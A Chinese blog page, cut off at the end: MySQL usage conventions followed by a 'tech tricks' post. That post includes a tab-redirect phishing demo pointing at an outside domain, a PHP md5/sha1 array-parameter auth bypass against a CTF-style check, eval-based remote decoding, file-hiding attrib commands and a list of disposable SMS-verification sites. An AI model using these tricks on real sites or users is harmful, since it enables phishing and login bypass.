<h4 id="13-WHERE从句中禁止对列进行函数转换和计算"><a href="#13-WHERE从句中禁止对列进行函数转换和计算" class="headerlink" title="13. WHERE从句中禁止对列进行函数转换和计算"></a>13. WHERE从句中禁止对列进行函数转换和计算</h4><p>对列进行函数转换或计算时会导致无法使用索引。<br>不推荐：<br>where date(create_time)=’20190101’</p>
<p>推荐：<br>where create_time &gt;= ‘20190101’ and create_time &lt; ‘20190102’</p>
<h4 id="14-在明显不会有重复值时使用-UNION-ALL-而不是-UNION"><a href="#14-在明显不会有重复值时使用-UNION-ALL-而不是-UNION" class="headerlink" title="14. 在明显不会有重复值时使用 UNION ALL 而不是 UNION"></a>14. 在明显不会有重复值时使用 UNION ALL 而不是 UNION</h4><p>UNION 会把两个结果集的所有数据放到临时表中后再进行去重操作。<br>UNION ALL 不会再对结果集进行去重操作。</p>
<h4 id="15-拆分复杂的大-SQL-为多个小-SQL"><a href="#15-拆分复杂的大-SQL-为多个小-SQL" class="headerlink" title="15. 拆分复杂的大 SQL 为多个小 SQL"></a>15. 拆分复杂的大 SQL 为多个小 SQL</h4><p>大 SQL：逻辑上比较复杂，需要占用大量 CPU 进行计算的SQL 。<br>MySQL：一个 SQL 只能使用一个 CPU 进行计算。<br>SQL 拆分后可以通过并行执行来提高处理效率。</p>
<h3 id="大limit"><a href="#大limit" class="headerlink" title="大limit"></a>大limit</h3><p>SELECT <em> FROM table ORDER BY TIME DESC LIMIT 10000,10;<br>这种分页方式会导致大量的 io，因为 MySQL 使用的是提前读取策略。<br>推荐分页方式：<br>SELECT </em> FROM table WHERE TIME&lt;last_TIME ORDER BY TIME DESC LIMIT 10.<br>SELECT * FROM table inner JOIN(SELECT id FROM table ORDER BY TIME LIMIT 10000,10) as t USING(id)</p>
<h3 id="数据库操作行为规范"><a href="#数据库操作行为规范" class="headerlink" title="数据库操作行为规范"></a>数据库操作行为规范</h3><h4 id="1-超-100-万行的批量写（UPDATE、DELETE、INSERT）操作，要分批多次进行操作"><a href="#1-超-100-万行的批量写（UPDATE、DELETE、INSERT）操作，要分批多次进行操作" class="headerlink" title="1. 超 100 万行的批量写（UPDATE、DELETE、INSERT）操作，要分批多次进行操作"></a>1. 超 100 万行的批量写（UPDATE、DELETE、INSERT）操作，要分批多次进行操作</h4><p>大批量操作可能会造成严重的主从延迟<br>主从环境中，大批量操作可能会造成严重的主从延迟，大批量的写操作一般都需要执行一定长的时间，而只有当主库上执行完成后，才会在其他从库上执行，所以会造成主库与从库长时间的延迟情况<br>Binlog 日志为 row 格式时会产生大量的日志<br>大批量写操作会产生大量日志，特别是对于 row 格式二进制数据而言，由于在 row 格式中会记录每一行数据的修改，我们一次修改的数据越多，产生的日志量也就会越多，日志的传输和恢复所需要的时间也就越长，这也是造成主从延迟的一个原因。<br>避免产生大事务操作<br>大批量修改数据，一定是在一个事务中进行的，这就会造成表中大批量数据进行锁定，从而导致大量的阻塞，阻塞会对 MySQL 的性能产生非常大的影响。<br>特别是长时间的阻塞会占满所有数据库的可用连接，这会使生产环境中的其他应用无法连接到数据库，因此一定要注意大批量写操作要进行分批。</p>
<h4 id="2-对于大表使用-pt-online-schema-change-修改表结构"><a href="#2-对于大表使用-pt-online-schema-change-修改表结构" class="headerlink" title="2. 对于大表使用 pt-online-schema-change 修改表结构"></a>2. 对于大表使用 pt-online-schema-change 修改表结构</h4><p>避免大表修改产生的主从延迟<br>避免在对表字段进行修改时进行锁表<br>对大表数据结构的修改一定要谨慎，会造成严重的锁表操作，尤其是生产环境，是不能容忍的。</p>
<p>pt-online-schema-change 它会首先建立一个与原表结构相同的新表，并且在新表上进行表结构的修改，然后再把原表中的数据复制到新表中，并在原表中增加一些触发器。</p>
<p>把原表中新增的数据也复制到新表中，在行所有数据复制完成之后，把新表命名成原表，并把原来的表删除掉,把原来一个 DDL 操作，分解成多个小的批次进行。</p>
<h4 id="3-禁止为程序使用的账号赋予-super-权限"><a href="#3-禁止为程序使用的账号赋予-super-权限" class="headerlink" title="3. 禁止为程序使用的账号赋予 super 权限"></a>3. 禁止为程序使用的账号赋予 super 权限</h4><p>当达到最大连接数限制时，还运行 1个 有 super 权限的用户连接 super 权限只能留给 DBA 处理问题的账号使用。</p>
<h4 id="4-对于程序连接数据库账号，遵循权限最小原则"><a href="#4-对于程序连接数据库账号，遵循权限最小原则" class="headerlink" title="4. 对于程序连接数据库账号，遵循权限最小原则"></a>4. 对于程序连接数据库账号，遵循权限最小原则</h4><p>程序使用数据库账号只能在一个 DB 下使用，不准跨库 程序使用的账号原则上不准有 drop 权限。</p>
<h3 id="修改表的默认字符集不会改表各个字段的字符集"><a href="#修改表的默认字符集不会改表各个字段的字符集" class="headerlink" title="修改表的默认字符集不会改表各个字段的字符集"></a>修改表的默认字符集不会改表各个字段的字符集</h3><p>很多初学者会将 ALTER TABLE tbl_name [DEFAULT] CHARACTER SET ‘UTF8’ 误认为会修改所有字段的字符集，但实际上它只会影响后续新增的字段不会改表已有字段的字符集。<br>如果想修改整张表所有字段的字符集建议使用 ALTER TABLE tbl_name CONVERT TO CHARACTER SET charset_name;</p>
<h3 id="多条-ALTER-请求建议合为一条"><a href="#多条-ALTER-请求建议合为一条" class="headerlink" title="多条 ALTER 请求建议合为一条"></a>多条 ALTER 请求建议合为一条</h3><p>ALTER TABLE tbl ADD COLUMN col int, ADD INDEX idx_col (<code>col</code>);</p>
<p><a href="https://dev.mysql.com/doc/employee/en/employees-installation.html" target="_blank" rel="noopener">MySQL测试数据</a></p>
<p><a href="https://blog.csdn.net/zytbft/article/details/84504348" target="_blank" rel="noopener"> SQL语句在线练习</a></p>
<p><a href="http://sqlfiddle.com/#!9" target="_blank" rel="noopener">MySQL在线测试</a></p>
<p><a href="https://github.com/XiaoMi/soar/blob/master/doc/heuristic.md" target="_blank" rel="noopener">MySQL 避坑宝典</a></p>
<p><a href="https://learnku.com/articles/25224" target="_blank" rel="noopener">面试之 Memcache 相关</a></p>
<p><a href="https://mp.weixin.qq.com/s/Tgi52hQj8ANerZIF8h_zgA" target="_blank" rel="noopener">一份非常完整的 MySQL 规范</a></p>
<p><a href="https://learnku.com/articles/25148#topnav" target="_blank" rel="noopener">MySQL 社区规范 | 数据库篇</a></p>
<p><a href="https://learnku.com/articles/25116#topnav" target="_blank" rel="noopener">MySQL 规范 (数据库表设计规范)</a></p>
<p><a href="https://learnku.com/articles/25020#topnav" target="_blank" rel="noopener">MySQL 规范</a></p>
<p><a href="http://cw.hubwiz.com/card/c/543b2f3cf86387171814c026/1/1/5/" target="_blank" rel="noopener">MongoDB教程</a></p>
<p><a href="https://github.com/StevenSLXie/Tutorials-for-Web-Developers/blob/master/MongoDB%20%E6%9E%81%E7%AE%80%E5%AE%9E%E8%B7%B5%E5%85%A5%E9%97%A8.md" target="_blank" rel="noopener">MongoDB 极简实践入门</a></p>
<p><a href="http://fanqieto.top/2017/11/23/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84%E4%BC%98%E5%8C%96/" target="_blank" rel="noopener">mysql数据库结构优化</a></p>
<p><a href="https://learnku.com/articles/18784#topnav" target="_blank" rel="noopener">MySQL 配置读写分离</a></p>
<p><a href="https://learnku.com/articles/27641" target="_blank" rel="noopener">MySQL 细致总结之中级篇</a></p>
<p><a href="https://learnku.com/articles/26434#topnav" target="_blank" rel="noopener">数据库并发如何让数据操作串行化</a></p>
<p><a href="https://segmentfault.com/a/1190000019284665" target="_blank" rel="noopener">去 BAT 面试，总结了这 55 道 MySQL 面试题！</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/01/那些黑科技/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/01/那些黑科技/" itemprop="url">那些黑科技</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-01T17:00:57+08:00">
                2019-03-01
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  20 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="远程控制地址栏"><a href="#远程控制地址栏" class="headerlink" title="远程控制地址栏"></a>远程控制地址栏</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//675ba661.w1n.pw/41593a https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;a href=<span class="string">"https://www.baidu.com"</span> target=<span class="string">"baidu"</span> id=<span class="string">"baidu"</span> onclick=<span class="string">"return start()"</span>&gt;click me&lt;<span class="regexp">/a&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">function start() &#123;</span></span><br><span class="line"><span class="regexp">    setInterval(function() &#123;</span></span><br><span class="line"><span class="regexp">        baidu.href="http:/</span><span class="regexp">/675ba661.w1n.pw/</span>baidu<span class="string">";</span></span><br><span class="line"><span class="string">        baidu.click();</span></span><br><span class="line"><span class="string">    &#125;, 10000);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;&lt;meta charset="</span>utf<span class="number">-8</span><span class="string">"&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;a href="</span>javascript:;<span class="string">" onclick="</span><span class="keyword">return</span> start()<span class="string">"&gt;click me&lt;/a&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">function start() &#123;</span></span><br><span class="line"><span class="string">    var w = window.open('https://www.baidu.com', 'baidu');</span></span><br><span class="line"><span class="string">    setInterval(function() &#123;</span></span><br><span class="line"><span class="string">        w.location = 'http://675ba661.w1n.pw/baidu'</span></span><br><span class="line"><span class="string">    &#125;, 5000)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP浮点精确度"><a href="#PHP浮点精确度" class="headerlink" title="PHP浮点精确度"></a>PHP浮点精确度</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.itcodemonkey.com/article/2185.html</span></span><br><span class="line">floor((<span class="number">0.1</span>+<span class="number">0.7</span>)*<span class="number">10</span>) 通常会返回 <span class="number">7</span> 而不是预期中的 <span class="number">8</span>，因为该结果内部的表示其实是类似 <span class="number">7.9999999999999991118</span>…。</span><br><span class="line">?year=<span class="number">2016.99999999999</span> 输出<span class="number">2017</span></span><br><span class="line">var_dump(<span class="string">"0e123"</span> == <span class="string">"0e456"</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0e123"</span> == <span class="string">"0eabc"</span>);  <span class="comment">//flase</span></span><br><span class="line"><span class="number">0e123</span>与<span class="number">0e456</span>相互不严格性质比较的时候，会将<span class="number">0</span>e这类字符串识为科学技术法的数字,<span class="number">0</span>的无论多少次方都是零，所以相等,输出 <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="number">0e123</span>与<span class="number">0</span>eabc相互进行不严格性质比较的时候，本应该将<span class="number">0</span>e这类字符串识为科学技术法的数字,但是这里的<span class="number">0</span>e后面跟着的是abc,数学中科学计数的指数不可以包含字母。所以这里字符串中虽然是<span class="number">0</span>e开头，但是后面的abc却不符合科学技法的规范，所以输出是 <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'flag&#123;I_think_that_I_just_broke_md5&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">'username'</span>]) and isset($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">        print <span class="string">'Your password can not be your username.'</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line">        die($flag);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        print <span class="string">'Invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'username'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line">并且得满足:</span><br><span class="line"><span class="keyword">if</span> (md5($_GET[<span class="string">'username'</span>]) === sha1($_GET[<span class="string">'password'</span>]))  ?username[]=a&amp;password[]=b</span><br></pre></td></tr></table></figure>
<h3 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h3><p>把hosts文件系统文件自动保护并隐藏的方法：</p>
<p>运行WIN+R，cmd，启动命令行以后，输入命令 ATTRIB +S +H +R HOSTS</p>
<p>还原为普通文件允许修改：</p>
<p>运行WIN+R，cmd，启动命令行以后，输入命令 ATTRIB -S -H -R HOSTS<br><a href="https://blog.gxxsite.com/hostswen-jian-bao-hu-jia-suo-yu-jie-suo-kuai-su-pei-zhi-ke-shang-github-google/" target="_blank" rel="noopener">https://blog.gxxsite.com/hostswen-jian-bao-hu-jia-suo-yu-jie-suo-kuai-su-pei-zhi-ke-shang-github-google/</a> </p>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$cipher = <span class="string">"XHg2OFx4NzRceDc0XHg3MFx4NzNceDNhXHgyZlx4MmZceDc0XHg2NVx4NzJceDZkXHg2Mlx4NjlceDZlXHgyZVx4NjNceDZmXHg2ZFx4MmZceDZjXHg2Y1x4NjJceDYz"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. base64</span></span><br><span class="line">$escaped_hex = base64_decode($cipher);</span><br><span class="line">echo <span class="string">'escaped_hex: '</span> . $escaped_hex . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. "\x" unescape https://learnku.com/articles/25862</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">'$url = "'</span> . $escaped_hex . <span class="string">'";'</span>);</span><br><span class="line">echo <span class="string">'url: '</span> . $url . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. read this url</span></span><br><span class="line">$resource = trim(</span><br><span class="line">    file_get_contents($url)</span><br><span class="line">);</span><br><span class="line">echo <span class="string">'resource: '</span> . $resource . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. trim</span></span><br><span class="line">$encoding = strstr($resource, <span class="string">':'</span>, <span class="literal">true</span>);</span><br><span class="line">echo <span class="string">'encoding: '</span> . $encoding . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. absorb real data</span></span><br><span class="line">$parts = explode(<span class="string">' '</span>, $resource);</span><br><span class="line">array_shift($parts);</span><br><span class="line">$hex = implode(<span class="string">''</span>, $parts);</span><br><span class="line">echo <span class="string">'hex: '</span> . $hex . PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. get the raw binary</span></span><br><span class="line">$bin = pack(<span class="string">'H*'</span>, $hex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. final convert</span></span><br><span class="line">$results = mb_convert_encoding($bin, <span class="string">'utf-8'</span>, $encoding);</span><br><span class="line">echo <span class="string">'RESULTS: '</span> . $results . PHP_EOL;</span><br></pre></td></tr></table></figure>
<h3 id="命令行进度条"><a href="#命令行进度条" class="headerlink" title="命令行进度条"></a>命令行进度条</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo <span class="string">"\033[41:37m \n Laravel ERROR : Oh My God, this is a bug!!! \n https://kuricat.com/gist/ansi-stdout-6s4pi"</span>;</span><br><span class="line">$count = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">100</span>; $i++) &#123;</span><br><span class="line">    usleep(<span class="number">50000</span>);</span><br><span class="line">    $color = $i % <span class="number">8</span> + <span class="number">40</span>;</span><br><span class="line">    $equalStr = str_repeat(<span class="string">"\033[&#123;$color&#125;;37m=\33[0m"</span>, $i);</span><br><span class="line">    $space    = str_repeat(<span class="string">" "</span>, $count - $i);</span><br><span class="line">    echo(<span class="string">"\r [$equalStr&gt;$space]($i/$count%)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="cookie编辑"><a href="#cookie编辑" class="headerlink" title="cookie编辑"></a>cookie编辑</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.cookie=<span class="string">"username=John Doe; expires=Thu, 18 Dec 2013 12:00:00 UTC; path=/"</span>; </span><br><span class="line">也可以删除cookie </span><br><span class="line">https:<span class="comment">//chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg</span></span><br><span class="line">https:<span class="comment">//superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome</span></span><br></pre></td></tr></table></figure>
<h3 id="国内外免费可用接收短信验证码平台网站"><a href="#国内外免费可用接收短信验证码平台网站" class="headerlink" title="国内外免费可用接收短信验证码平台网站"></a>国内外免费可用接收短信验证码平台网站</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.09l.me/714.html</span></span><br><span class="line">免费接收短信	http:<span class="comment">//www.shejiinn.com/	中国、缅甸</span></span><br><span class="line">Z-SMS	http:<span class="comment">//z-sms.com/	中国、美国、缅甸、爱沙尼亚</span></span><br><span class="line">免费接收短信	http:<span class="comment">//www.smszk.com/	中国</span></span><br><span class="line">在线接收短信	https:<span class="comment">//www.becmd.com/	美国、中国</span></span><br><span class="line">在线短信接收	https:<span class="comment">//www.pdflibr.com/	美国、中国、菲律宾</span></span><br><span class="line">MyTrashmobile	https:<span class="comment">//zh.mytrashmobile.com/	美国、英国、加拿大</span></span><br><span class="line">FreePhonenum	https:<span class="comment">//ch.freephonenum.com/	美国、加拿大(支持免费发短信)</span></span><br><span class="line">ReceiveSMS	https:<span class="comment">//www.receivesms.co/	奥地利、比利时、加拿大、瑞士、丹麦、西班牙、英国、意大利、拉脱维亚、波兰、葡萄牙、瑞典、美国</span></span><br><span class="line">Receive SMS	http:<span class="comment">//receivesmsverification.com/	比利时、英国、美国</span></span><br><span class="line">Receive Online SMS	http:<span class="comment">//receiveonlinesms.biz/	美国、瑞典、挪威、西班牙、英国</span></span><br><span class="line">Receive Free SMS	http:<span class="comment">//www.freesmsverifications.com/	美国、英国、法国、波兰、比利时、加拿大</span></span><br><span class="line">SMS-Receive	https:<span class="comment">//sms-receive.net/	俄罗斯、法国、罗马尼亚、西班牙、荷兰、英国</span></span><br><span class="line">Receive-SMS-Now	http:<span class="comment">//www.receive-sms-now.com/	美国、加拿大、荷兰</span></span><br><span class="line">Receive SMS Online	http:<span class="comment">//receivesmsonline.in/	美国、加拿大、西班牙</span></span><br><span class="line">Receive-SMS-Now	http:<span class="comment">//receivefreesms.net/	美国、加拿大、西班牙</span></span><br><span class="line">SMSReceiveFree	https:<span class="comment">//smsreceivefree.com	美国、英国、加拿大</span></span><br><span class="line">Receive SMS Online <span class="keyword">for</span> FREE	https:<span class="comment">//www.receive-sms-online.info/	英国、罗马尼亚、美国、西班牙、法国、德国、俄罗斯</span></span><br><span class="line">Receive a SMS Online	https:<span class="comment">//receive-a-sms.com/	美国、澳大利亚、挪威、奥地利、巴西、香港、南非、波兰、英国、加拿大</span></span><br><span class="line">Free SMS Numbers Online	https:<span class="comment">//smsnumbersonline.com/	美国、英国、加拿大、波兰</span></span><br><span class="line">Receive SMS online <span class="keyword">for</span> Free	https:<span class="comment">//sms-online.co/receive-free-sms	美国、英国、加拿大、瑞典、法国、马来西亚、印度尼西亚</span></span><br><span class="line">Receive-SMS	https:<span class="comment">//receive-sms.com/	美国</span></span><br><span class="line">Receive FREE SMS online	http:<span class="comment">//receivefreesms.com/	美国、英国、挪威、瑞典、荷兰、澳大利亚、匈牙利、立陶宛、香港等</span></span><br><span class="line">RECEIVE SMS ONLINE	https:<span class="comment">//www.receivesmsonline.net/	美国、加拿大、英国</span></span><br><span class="line">Free Online Phone	https:<span class="comment">//www.freeonlinephone.org	美国、加拿大、英国、瑞典</span></span><br><span class="line">Receive SMS Online	http:<span class="comment">//receive-sms-online.com	俄国、英国、乌克兰</span></span><br><span class="line">TextNow	https:<span class="comment">//www.textnow.com/	美国</span></span><br><span class="line">Textfree	https:<span class="comment">//www.pinger.com/text-free/	</span></span><br><span class="line">SELLAITE	http:<span class="comment">//sms.sellaite.com/	爱沙尼亚</span></span><br><span class="line">Twilio	https:<span class="comment">//www.twilio.com/	支持API调用，看上去很不错</span></span><br></pre></td></tr></table></figure>
<h3 id="隐藏文件夹"><a href="#隐藏文件夹" class="headerlink" title="隐藏文件夹"></a>隐藏文件夹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在命令提示符下输入：attrib +s +a +h +r d:不告诉你，回车，就彻底隐藏了D:\不告诉你文件夹了，即使在显示隐藏的文件、文件夹和驱动器下也可以将其隐藏起来。</span><br><span class="line">直接在地址栏输文件夹名不告诉你即可打开文件夹，神不知鬼不觉</span><br><span class="line">需要在命令提示符下输入：attrib -s -a -h -r d:不告诉你，回车，此时不告诉你文件夹就显示出来了。</span><br></pre></td></tr></table></figure>
<h3 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg.exe</span><br><span class="line">ffmpeg是用于转码的应用程序。</span><br><span class="line">一个简单的转码命令可以这样写：</span><br><span class="line">将input.avi转码成output.ts，并设置视频的码率为<span class="number">640</span>kbps</span><br><span class="line">ffmpeg -i input.avi -b:v <span class="number">640</span>k output.ts</span><br><span class="line">ffplay.exe</span><br><span class="line">ffplay是用于播放的应用程序。</span><br><span class="line">一个简单的播放命令可以这样写：</span><br><span class="line"># 播放test.avi</span><br><span class="line">ffplay test.avi</span><br><span class="line"></span><br><span class="line"># 将视频流下载并合并成 out.mkv </span><br><span class="line">ffmpeg -i http:<span class="comment">//...m3u8 -c copy out.mkv</span></span><br><span class="line">ffmpeg 的一些参数</span><br><span class="line">基本使用方式：</span><br><span class="line">ffmpeg [[options][<span class="string">`-i’ input_file]] &#123;[options] output_file&#125; </span></span><br><span class="line"><span class="string">a) 通用选项</span></span><br><span class="line"><span class="string">ffmpeg -h 帮助，查看所有参数说明</span></span><br><span class="line"><span 